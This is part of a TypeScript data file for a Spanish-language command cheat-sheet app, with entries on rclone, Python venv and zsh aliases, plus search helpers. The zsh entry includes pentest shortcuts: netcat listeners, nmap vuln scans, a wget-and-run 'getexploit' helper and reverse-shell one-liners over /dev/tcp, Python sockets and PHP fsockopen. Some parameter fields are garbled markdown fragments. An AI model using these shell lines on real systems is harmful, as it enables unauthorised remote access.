      },
      {
        "param": "--dry-run",
        "description": "Muestra un apreview sobre el comando a ejecutar.",
        "example": "rcloud   -comand —dry-run"
      },
      {
        "param": "--update",
        "description": "Actualiza solo lo mas reciente",
        "example": "rclone —command —update"
      }
    ],
    "output": "",
    "notes": "- Antes de sincronizar, **usa** **`--dry-run`** para evitar errores fatales.\n- **Programar backups automáticos** con `cron`\n- Rclone puede cifrar tus datos con `rclone config` → tipo `crypt7`",
    "references": [
      "Documentación"
    ],
    "created_at": "2025-10-10T01:31:00.000Z",
    "updated_at": "2026-04-18T18:30:00.000Z"
  },
  {
    "id": "289ec7e7-4fc0-805d-b274-f6e0f779ad51",
    "title": "Venv",
    "command": "python -m venv /path/to/new/virtual/environment",
    "description": "Como usar Virtual Envirronments ",
    "category": "Config",
    "tags": [],
    "examples": [
      "# Windows / Linux / macOS\npython -m venv .venv",
      "# Windows (PowerShell)\n.venv\\Scripts\\Activate.ps1\n\n# Windows (CMD)\n.venv\\Scripts\\activate.bat\n\n# Linux / macOS (bash/zsh)\nsource .venv/bin/activate",
      "deactivate",
      "python -m pip install -U pip\npip install requests\npip freeze > requirements.txt\npip install -r requirements.txt",
      "# Linux / macOS\nrm -rf .venv\n\n# Windows (PowerShell)\nRemove-Item -Recurse -Force .venv"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "# Windows / Linux / macOS\npython -m venv .venv",
    "parameters": [],
    "output": "",
    "notes": "- Usa el nombre `.venv` por convención y agrégalo a tu `.gitignore`.\n- Si PowerShell bloquea scripts, ejecuta (temporalmente):\n\n    ```powershell\n    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n    ```\n\n- Confirma que estás en el venv:\n\n    ```bash\n    which python  # Linux/macOS\n    where python  # Windows\n    ```",
    "references": [
      "https://docs.python.org/3/library/venv.html"
    ],
    "created_at": "2025-10-11T19:21:00.000Z",
    "updated_at": "2026-04-18T18:31:00.000Z"
  },
  {
    "id": "2d7ec7e7-4fc0-8054-a7ea-de3d27892a26",
    "title": "zsh",
    "command": "sudo nano ~/.zshrc ",
    "description": "Cheas para configurar zshrc",
    "category": "General",
    "tags": [],
    "examples": [
      "z <nombre_carpeta>    # Salta a carpeta (recordar frecuencia)\nz -                   # Vuelve a carpeta anterior\nzi                    # Interactivo (FZF)",
      "bat archivo.py        # Ver archivo con colores\nbat -l man archivo    # Aplicar formato de man\nalias bat='batcat'    # Ya está configurado en tu zshrc",
      "Ctrl+T                # Buscar archivos en directorio actual\nCtrl+R                # Buscar en historial\nAlt+C                 # Navegar directorios\n\n# Completar con FZF en cualquier comando (usa **)\ncd **<TAB>            # Buscar directorios para cd\nls **<TAB>            # Buscar archivos para listar\ncat **<TAB>           # Buscar archivo para ver contenido\ngrep patrón **<TAB>   # Buscar archivos para grep",
      "alias ls='lsd'        # ls con colores y iconos\nll                    # ls -l (detalles)\nla                    # ls -A (ocultos)\nl                     # ls -CF (compact)",
      "..                    # cd ..\n...                   # cd ../..\n....                  # cd ../../..\n.....                 # cd ../../../..",
      "alias history=\"history 0\"    # Ver todo el historial",
      "du                    # du -h (tamaño carpetas)\ndf                    # df -h (espacios montar)",
      "export EDITOR=nvim    # O vim/nano\nexport VISUAL=$EDITOR",
      "myip                  # Todas las IPs (local + VPN)\nmyip4                 # Solo IPv4 (sin loopback)\nmyip6                 # Solo IPv6\nvpnip                 # IP del tun0 (VPN)",
      "www                   # Python HTTP.server en puerto 80\nwww8                  # Python HTTP.server en puerto 8000\nphpserver             # PHP server en 0.0.0.0:8000",
      "ports                 # netstat -tulanp (puertos escuchando)\nlistening             # lsof -i -P (conexiones activas)\nportscan              # nmap -sS -sV -O",
      "sgrep \"pattern\"       # grep -R -n -H -C 5 (recursivo con contexto)",
      "cpv                   # rsync -ah --info=progress2 (Copia visible)",
      "extract archivo.tar.gz     # Extrae automáticamente (.tar.bz2, .zip, .rar, .7z, etc.)",
      "gs                    # git status\nga                    # git add\ngc \"mensaje\"          # git commit -m \"mensaje\"\ngp                    # git push\ngl                    # git log --oneline --graph --decorate",
      "mkcd nombre           # mkdir -p nombre && cd nombre",
      "kp nombre_proceso     # Mata proceso por nombre (sudo kill -9)",
      "hs \"búsqueda\"         # history | grep \"búsqueda\"",
      "cp_p archivo1 archivo2   # Copia visual con barra de progreso",
      "genpass               # 16 caracteres aleatorios (default)\ngenpass 32            # 32 caracteres aleatorios",
      "listports             # sudo netstat -tulanp | grep LISTEN",
      "ff \"nombre\"           # find . -type f -iname \"*nombre*\"\nfd \"nombre\"           # find . -type d -iname \"*nombre*\"",
      "bk archivo.txt        # archivo.txt.bak.YYYYMMDD_HHMMSS",
      "path                  # Muestra cada ruta en una línea",
      "transfer archivo      # Sube y devuelve URL pública temporal",
      "extract archivo       # Detecta formato y extrae (.tar, .zip, .7z, .rar, .gz, etc.)",
      "nmap-quick <target>   # nmap -sC -sV -oN quick.txt <target>\nnmap-full <target>    # nmap -p- -sC -sV -oN full.txt <target>\nnmap-udp <target>     # sudo nmap -sU -sC -sV -oN udp.txt <target>\nnmap-vuln <target>    # nmap --script vuln -oN vuln.txt <target>",
      "ctfscan 10.10.10.1    # nmap -sC -sV -oA nmap/10.10.10.1 10.10.10.1\n                      # Crea carpeta nmap/ y guarda 3 formatos (.nmap, .gnmap, .xml)",
      "listen                # nc -lvnp 443 (default)\nlisten 4444           # nc -lvnp 4444\n                      # Usa rlwrap para historial + edición",
      "nc 192.168.1.1 4444   # netcat directo (con rlwrap)\nalias nc='rlwrap nc'",
      "ttyup                 # Muestra guía paso a paso\n                      # 1. python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n                      # 2. Ctrl+Z\n                      # 3. stty raw -echo; fg\n                      # 4. export TERM=xterm\n                      # 5. stty rows 38 columns 116",
      "echo \"texto\" | clip   # Copiar a clipboard\npaste                 # Pegar desde clipboard",
      "getexploit https://github.com/...script.py\n                      # wget URL -O nombre && chmod +x nombre",
      "update                # sudo apt update && full-upgrade -y && autoremove -y",
      "HISTFILE=~/.zsh_history    # 50,000 líneas guardadas\nHISTSIZE=50000\nSAVEHIST=50000\n\n# Opciones:\n# - hist_expire_dups_first: Borra duplicados primero\n# - hist_ignore_dups: No guarda comandos iguales consecutivos\n# - hist_ignore_space: Ignora comandos que comienzan con espacio\n# - extended_history: Guarda timestamp",
      "export MANPAGER=\"sh -c 'col -bx | bat -l man -p'\"    # man con colores\nexport FZF_DEFAULT_OPTS=\"--height 40% --layout=reverse --border\"\nexport TERM=xterm-256color\nexport EDITOR=nvim",
      "# zsh completion automático\n# zstyle options para colors, matcher-list, etc.",
      "Ctrl+Space  # Acepta sugerencia",
      "cd /path1      # pushd automático\ncd /path2\npopd           # Vuelve a /path1",
      "ls=lsd         # Expande a ls --color=auto\nnmap=nmap -sC -sV    # Expande automáticamente",
      "setopt correct        # ❌ Puede auto-corregir comandos peligrosos",
      "setopt noclobber      # ✅ Previene sobrescribir archivos con >\nsetopt rm_star_wait   # ✅ Espera 10 segundos antes de rm *\nsetopt hist_ignore_space   # ✅ Ignora comandos con espacio prefix",
      "Alternar con:",
      "---\n\n\n## 📝 Crear tus propios aliases/funciones\n\n\n### Alias simple",
      "### Función personalizada",
      "---\n\n\n## 🚀 Rápido - Comandos más usados"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "z <nombre_carpeta>    # Salta a carpeta (recordar frecuencia)\nz -                   # Vuelve a carpeta anterior\nzi                    # Interactivo (FZF)",
    "parameters": [
      {
        "param": "Ctrl+A",
        "description": "Inicio de línea",
        "example": "| `Ctrl+E`"
      },
      {
        "param": "Ctrl+<-",
        "description": "Palabra anterior",
        "example": "| `Ctrl+->`"
      },
      {
        "param": "Ctrl+U",
        "description": "Borrar línea (backward-kill-line)",
        "example": "| `Ctrl+Supr`"
      },
      {
        "param": "Delete",
        "description": "Borrar carácter",
        "example": "### Historial"
      },
      {
        "param": "↑",
        "description": "Comando anterior (busca en historial)",
        "example": "| `↓`"
      },
      {
        "param": "Ctrl+R",
        "description": "Búsqueda incremental en historial",
        "example": "| `Ctrl+S`"
      },
      {
        "param": "Shift+Tab",
        "description": "Deshacer última acción (undo)",
        "example": "| `Ctrl+P`"
      },
      {
        "param": "Ctrl+Space",
        "description": "Aceptar autosuggestion",
        "example": "### FZF"
      },
      {
        "param": "Ctrl+T",
        "description": "Buscar archivo",
        "example": "| `Ctrl+R`"
      },
      {
        "param": "Alt+C",
        "description": "Navegar directorios",
        "example": "| `Tab`"
      }
    ],
    "output": "revshell              # Detecta IP de tun0 y puerto 443 (default)\nrevshell 192.168.1.1  # IP custom, puerto 443\nrevshell 192.168.1.1 4444   # IP y puerto custom\n\n# Output: 3 opciones (bash, python3, php)\n# bash -i >& /dev/tcp/IP/PORT 0>&1\n# python3 -c 'import socket,subprocess,os;s=...'\n# php -r '$sock=fsockopen(\"IP\",PORT);...'",
    "notes": "",
    "references": [],
    "created_at": "2025-12-28T04:22:00.000Z",
    "updated_at": "2026-03-03T02:08:00.000Z"
  }
];

// Convertir categorías de strings a objetos para compatibilidad con componentes
export const categories = [
  { id: 'all', name: 'Todos los comandos', color: 'gray', count: commands.length },
  ...([...new Set(commands.map(cmd => cmd.category))].sort().map(category => ({
    id: category.toLowerCase().replace(/\s+/g, '-'),
    name: category,
    color: getCategoryColor(category),
    count: commands.filter(cmd => cmd.category === category).length
  })))
];

// Función para asignar colores a categorías
function getCategoryColor(category: string): string {
  const colorMap: { [key: string]: string } = {
    'dns': 'blue',
    'linux': 'green',
    'security': 'red',
    'network': 'indigo',
    'database': 'purple',
    'web': 'orange',
    'git': 'teal',
    'docker': 'cyan'
  };
  
  return colorMap[category.toLowerCase()] || 'gray';
}

export function getCommandById(id: string): Command | undefined {
  return commands.find(cmd => cmd.id === id);
}

export function getCommandsByCategory(category: string): Command[] {
  if (category === 'all') return commands;
  return commands.filter(cmd => cmd.category === category);
}

export function searchCommands(query: string): Command[] {
  const searchTerm = query.toLowerCase();
  return commands.filter(cmd => 
    cmd.title.toLowerCase().includes(searchTerm) ||
    cmd.command.toLowerCase().includes(searchTerm) ||
    cmd.description.toLowerCase().includes(searchTerm) ||
    cmd.tags.some(tag => tag.toLowerCase().includes(searchTerm))
  );
}
